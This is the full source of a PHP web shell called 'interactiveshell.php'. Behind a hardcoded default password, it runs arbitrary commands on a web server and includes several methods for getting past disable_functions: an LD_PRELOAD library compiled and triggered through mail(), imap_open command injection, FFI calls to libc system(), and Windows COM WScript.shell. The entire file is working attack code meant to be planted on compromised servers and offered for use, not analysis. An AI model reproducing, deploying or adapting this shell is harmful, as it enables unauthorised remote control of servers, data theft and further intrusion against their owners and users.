<?php
/**
 * interactiveshell.php — Multi-bypass command execution, PHP 5.2+ compatible
 * Target: PHP 5.2 - 8.x, Windows/Linux, disable_functions bypass
 * Password default: 0xdeadbeef (ganti di bawah)
 */

$PASS = '0xdeadbeef';

// ========== DISABLED FUNCTIONS DETECTION ==========
$disabled_str = ini_get('disable_functions');
$disabled = array();
if ($disabled_str) {
    $tmp = explode(',', $disabled_str);
    foreach ($tmp as $f) $disabled[] = trim($f);
}

$available = array();
$candidates = array('system','exec','shell_exec','passthru','proc_open','popen','mail','imap_open','putenv','stream_socket_server','fsockopen');
foreach ($candidates as $fn) {
    if (function_exists($fn) && !in_array($fn, $disabled)) {
        $available[] = $fn;
    }
}

// ========== AUTH ==========
session_start();
if (isset($_POST['logout'])) { session_destroy(); header('Location: ?'); exit; }
if (isset($_POST['pass']) && $_POST['pass'] === $PASS) { $_SESSION['auth'] = true; }
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    die('<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;margin-top:20%"><h2>Locked</h2><form method="POST"><input type="password" name="pass" placeholder="password" autofocus><input type="submit" value="login"></form></body></html>');
}

// ========== BYPASS IMPLEMENTATIONS ==========

function _run_proc_open($cmd, &$out, &$err) {
    $desc = array();
    $desc[0] = array('pipe','r');
    $desc[1] = array('pipe','w');
    $desc[2] = array('pipe','w');
    $p = @proc_open($cmd, $desc, $pipes);
    if (!is_resource($p)) return false;
    fclose($pipes[0]);
    $out = stream_get_contents($pipes[1]);
    $err = stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($p);
    return true;
}

function _run_mail_bypass($cmd) {
    $so = '/tmp/.x'.substr(md5(uniqid()),0,8).'.so';
    $src = "#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) static void init(){system(\"$cmd\");}";
    @file_put_contents('/tmp/x.c',$src);
    @exec("gcc -shared -fPIC -o $so /tmp/x.c 2>/dev/null");
    if (!file_exists($so)) return false;
    @putenv("LD_PRELOAD=$so");
    @mail('a@a.a','','');
    @putenv("LD_PRELOAD=");
    @unlink($so); @unlink('/tmp/x.c');
    return true;
}

function _run_imap_bypass($cmd) {
    if (!extension_loaded('imap')) return false;
    $payload = "{".$_SERVER['HTTP_HOST']."/bin/sh -c '$cmd > /tmp/xout 2>&1'}INBOX";
    @imap_open($payload,'x','x');
    sleep(1);
    $r = @file_get_contents('/tmp/xout');
    @unlink('/tmp/xout');
    return $r;
}

function _run_ffi_bypass($cmd) {
    if (!extension_loaded('ffi')) return false;
    if (version_compare(PHP_VERSION,'7.4.0','<')) return false;
    try {
        $ffi = @FFI::cdef("int system(const char *cmd);","libc.so.6");
        $ffi->system($cmd);
        return true;
    } catch(Exception $e) { return false; }
}

function _run_com_bypass($cmd) {
    if (!class_exists('COM')) return false;
    try {
        $o = new COM("WScript.shell");
        $o->Run($cmd,0,false);
        return true;
    } catch(Exception $e) { return false; }
}

// ========== MAIN EXECUTION ==========

$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
$method = isset($_POST['method']) ? $_POST['method'] : 'auto';
$out = $err = '';
$ret = false;

if ($cmd) {
    if ($method === 'auto') {
        if (in_array('proc_open',$available)) $method='proc_open';
        elseif (in_array('popen',$available)) $method='popen';
        elseif (in_array('system',$available)) $method='system';
        elseif (in_array('exec',$available)) $method='exec';
        elseif (in_array('shell_exec',$available)) $method='shell_exec';
        elseif (in_array('passthru',$available)) $method='passthru';
        else $method='auto_fail';
    }

    // Windows: 2>&1 unsupported in some cmd, keep as-is
    $cmd2 = $cmd;
    if (strtoupper(substr(PHP_OS,0,3)) !== 'WIN') {
        $cmd2 .= ' 2>&1';
    }

    switch($method) {
        case 'proc_open':
            $ret = _run_proc_open($cmd,$out,$err);
            break;
        case 'popen':
            $p = @popen($cmd2,'r');
            if ($p) { while(!feof($p)) $out .= fgets($p); pclose($p); $ret=true; }
            break;
        case 'system':
            ob_start(); @system($cmd2); $out = ob_get_clean(); $ret=true;
            break;
        case 'exec':
            @exec($cmd2,$o); $out = implode("\n",$o); $ret=true;
            break;
        case 'shell_exec':
            $out = @shell_exec($cmd2); $ret=true;
            break;
        case 'passthru':
            ob_start(); @passthru($cmd2); $out = ob_get_clean(); $ret=true;
            break;
        case 'ffi':
            $ret = _run_ffi_bypass($cmd);
            if($ret) $out="[FFI] command sent";
            break;
        case 'com':
            $ret = _run_com_bypass($cmd);
            if($ret) $out="[COM] command sent";
            break;
        case 'imap':
            $r = _run_imap_bypass($cmd);
            if($r!==false) { $out=$r; $ret=true; }
            else $err="imap bypass failed or extension missing";
            break;
        case 'mail':
            $ret = _run_mail_bypass($cmd);
            if($ret) $out="[mail] LD_PRELOAD sent, check /tmp or target";
            break;
        case 'auto_fail':
            $err = "No execution functions available. All disabled.";
            $ret = false;
            break;
        default:
            $err = "Method not implemented or not available";
            $ret = false;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<title>_sh</title>
<style>
body{background:#0a0a0a;color:#c9d1d9;font-family:monospace;font-size:14px;padding:20px;margin:0}
h1{color:#58a6ff;font-size:16px;border-bottom:1px solid #30363d;padding-bottom:8px;margin-bottom:16px}
.meta{color:#8b949e;font-size:12px;margin-bottom:8px}
.meta span.label{color:#79c0ff;margin-right:8px}
textarea{width:100%;background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:10px;font-family:monospace;font-size:14px;min-height:50px;resize:vertical}
select,input,button{background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:8px 12px;font-family:monospace}
button{background:#238636;color:#fff;cursor:pointer}
button:hover{background:#2ea043}
.row{display:flex;gap:10px;margin:10px 0;flex-wrap:wrap}
.output{background:#161b22;border:1px solid #30363d;padding:15px;min-height:200px;white-space:pre-wrap;word-wrap:break-word;color:#7ee787}
.error{color:#f85149}
.logout{float:right}.logout button{background:#f85149;padding:4px 8px;font-size:12px}
</style>
</head>
<body>
<div class="logout"><form method="POST"><input type="hidden" name="logout" value="1"><button>logout</button></form></div>
<h1>interactiveshell</h1>

<div class="meta"><span class="label">user:</span><span><?php echo htmlspecialchars(get_current_user().' uid='.getmyuid()); ?></span></div>
<div class="meta"><span class="label">php:</span><span><?php echo PHP_VERSION; ?></span></div>
<div class="meta"><span class="label">os:</span><span><?php echo PHP_OS; ?></span></div>
<div class="meta"><span class="label">disabled:</span><span><?php echo count($disabled)?htmlspecialchars(implode(', ',$disabled)):'none'; ?></span></div>
<div class="meta"><span class="label">available:</span><span><?php echo count($available)?htmlspecialchars(implode(', ',$available)):'none'; ?></span></div>

<form method="POST">
<textarea name="cmd" placeholder="id && uname -a && whoami"><?php echo htmlspecialchars($cmd); ?></textarea>
<div class="row">
<select name="method">
<option value="auto">auto</option>
<option value="proc_open">proc_open</option>
<option value="popen">popen</option>
<option value="system">system</option>
<option value="exec">exec</option>
<option value="shell_exec">shell_exec</option>
<option value="passthru">passthru</option>
<option value="ffi">ffi</option>
<option value="com">com</option>
<option value="imap">imap bypass</option>
<option value="mail">mail bypass</option>
</select>
<button type="submit">run</button>
</div>
</form>

<h1 style="margin-top:20px">output</h1>
<div class="output<?php echo $err?' error':''; ?>"><?php
if($err) echo htmlspecialchars($err)."\n";
if($out) echo htmlspecialchars($out)."\n";
if($ret===true && !$out && !$err) echo "[exit 0, no output]\n";
if($ret===false && !$err) echo "[execution failed]\n";
?></div>

<div class="meta" style="margin-top:20px">
<span class="label">bypass notes:</span>
<span>mail=needs gcc+sendmail | imap=needs imap ext+writeable /tmp | ffi=needs PHP7.4+ ffi.enable | com=Windows-only</span>
</div>
</body>
</html>
